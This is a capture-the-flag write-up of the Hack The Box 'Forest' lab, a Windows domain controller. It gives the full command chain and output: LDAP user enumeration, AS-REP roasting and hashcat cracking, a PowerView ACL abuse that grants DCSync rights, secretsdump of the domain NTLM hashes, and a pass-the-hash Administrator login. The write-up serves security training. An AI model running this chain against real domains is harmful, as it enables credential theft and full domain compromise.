+++
date = '2025-02-15T09:17:33-05:00'
draft = false
title = 'HtB Forest'
tags = ['writeup','hackthebox','easy','windows','active directory']
hideToc = false
+++
![HtB-Forest](/images/Forest.png)

Forest in an easy difficulty Windows Domain Controller (DC), for a domain in which Exchange Server has been installed. The DC is found to allow anonymous LDAP binds, which is used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/forest]
└─$ nmap -T4 -p- -A 10.129.95.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 15:25 EST
Nmap scan report for 10.129.95.210
Host is up (0.023s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-14 20:32:51Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49700/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=2/14%OT=53%CT=1%CU=31056%PV=Y%DS=2%DC=T%G=Y%TM=67AFA72
OS:3%P=aarch64-unknown-linux-gnu)SEQ(CI=I%TS=A)SEQ(TI=I%CI=I%II=I%SS=S%TS=A
OS:)SEQ(SP=108%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=108%GCD=2%ISR=
OS:10A%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FE%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=S
OS:%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O
OS:5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6
OS:=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%D
OS:F=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-14T20:33:55
|_  start_date: 2025-02-14T20:31:21
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h46m49s, deviation: 4h37m08s, median: 6m48s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-02-14T12:33:54-08:00
```

### SMB

SMB is denying all connections without proper authentication.

### LDAP

It would appear we have anonymous access to the LDAP server.

![forest1](/images/forest1.png)

Looks like we're able to grab a list of domain users and service accounts.

```users.txt
santi
sebastien
andy
lucinda
mark
svc-alfresco
administrator
krbtgt
```

## Initial Access

### GetNPUsers

With our user list, we can check to see if any of the user accounts have `UF_DONT_REQUIRE_PREAUTH` enabled. If so, we'll be able to grab a kerberos hash and hopefully crack it.

```sh
┌──(pl4stic㉿kali)-[~/htb/forest]
└─$ impacket-GetNPUsers -no-pass -usersfile users.txt htb.local/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:2f12281e26a7a64c0950338661e07063$211f14809a6db4a9ec60870c956ed39ecef88d488521a91c467f153b3622186261e36fc26e469bdb49d67ec4d6831f4171c1898592f7dea727bd828c4c67dc4cf2146c1f6a4f9af843a8d2a1c9d9c328a15776d245c3adf9b9d3b42a2c56fbcd24d48d55eef6b8184a7537b9ef22330151df861e7ed5517308e98c468bb577dcf4dd899532b1ac5d30a449e36b89ebbdf42450fad1e3686fed706b06332f8ef9c3892fcf60ff54f0b8fb075b3d5e310df5ef745a597f3e8a5fb3489581df9ec1903799af921f0c9653a1063bcfe3e30d1db81f82669785c389354ab7c38b0f17349b3f3efe61
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Looks like the service account `svc-alfresco` was misconfigured and gave us their hash, let's try and crack it.

#### Hash Crack

```sh
┌──(pl4stic㉿kali)-[~/htb/forest]
└─$ hashcat -m 18200 svc-alfresco_hash.txt /usr/share/wordlists/rockyou.txt

[...snip...]

$krb5asrep$23$svc-alfresco@HTB.LOCAL:2f12281e26a7a64c0950338661e07063$211f14809a6db4a9ec60870c956ed39ecef88d488521a91c467f153b3622186261e36fc26e469bdb49d67ec4d6831f4171c1898592f7dea727bd828c4c67dc4cf2146c1f6a4f9af843a8d2a1c9d9c328a15776d245c3adf9b9d3b42a2c56fbcd24d48d55eef6b8184a7537b9ef22330151df861e7ed5517308e98c468bb577dcf4dd899532b1ac5d30a449e36b89ebbdf42450fad1e3686fed706b06332f8ef9c3892fcf60ff54f0b8fb075b3d5e310df5ef745a597f3e8a5fb3489581df9ec1903799af921f0c9653a1063bcfe3e30d1db81f82669785c389354ab7c38b0f17349b3f3efe61:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:2f12281e26a7a6...3efe61
Time.Started.....: Fri Feb 14 15:51:39 2025 (1 sec)
Time.Estimated...: Fri Feb 14 15:51:40 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3293.1 kH/s (0.98ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4087808/14344385 (28.50%)
Rejected.........: 0/4087808 (0.00%)
Restore.Point....: 4083712/14344385 (28.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s523480 -> s2704081
Hardware.Mon.#1..: Util: 79%
```

Perfect! Now we've got a valid credential: `HTB.LOCAL\svc-alfresco:s3rvice`

### WinRM

Our nmap scan showed port 5985 open, which makes me think WinRM is enabled on this machine. Let's try logging in as `svc-alfresco`.

```sh
┌──(pl4stic㉿kali)-[~/htb/forest]
└─$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice          

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

## Shell as svc-alfresco

### Enumeration w/ Bloodhound

```sh
┌──(pl4stic㉿kali)-[~/htb/forest]
└─$ bloodhound-python -c all -d htb.local -ns 10.129.95.210 -u 'svc-alfresco' -p 's3rvice'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 32 users
INFO: Found 76 groups
INFO: Found 2 gpos
INFO: Found 15 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
WARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 08S
```

![forest2](/images/forest2.png)
![forest3](/images/forest3.png)

## Privilege Escalation

### Add to Exchange Windows Permissions

Looking at our Bloodhound enumeration, `svc-alfresco` is a member of the `Service Accounts` group, which essentially makes him part of the `Account Operators` group.  We see that `Account Operators` has `GenericAll` permissions for the `Exchange Windows Permissions` group, which means we can add `svc-alfresco` to that group. Once our user is a member of that group, we can exploit the `WriteDacl` permission to get Administrator privileges.

Step one, let's add `svc-alfresco` to the `Service Accounts Group`.  We'll need to import `PowerView.ps1` into our session for these commands to work.

```PowerShell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
```

After running the command, we see it worked. However, the machine resets after about a minute, so we may have to chain all our commands together.

### Exploit WriteDacl

The next command we need is one to give `svc-alfresco` the `DCSync` rights, so we can dump secrets from the domain controller. If we right click on the `WriteDacl` line in BloodHound and select "Help", there's some nice instructions on how to do this.

```PowerShell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
```

Since we're going to have to chain this command with the one from the previous step, let's clean it up a bit. Combined script is as follows:

```PowerShell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $SecPassword = ConvertTo-SecureString 's3rvice' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $SecPassword); Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
```

### Secrets Dump

Immediately after running that previous chained command, run `impacket-secretsdump` to grab all the hashes from the machine.

```sh
┌──(pl4stic㉿kali)-[~/htb/forest]
└─$ impacket-secretsdump HTB.local/svc-alfresco:s3rvice@10.129.195.40
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[...snip...]
[*] Cleaning up...
```

### Shell as Administrator

Now you've got the Administrator hash; login using WinRM and grab your `root.txt`

```sh
┌──(pl4stic㉿kali)-[~/htb/forest]
└─$ evil-winrm -i 10.129.195.40 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```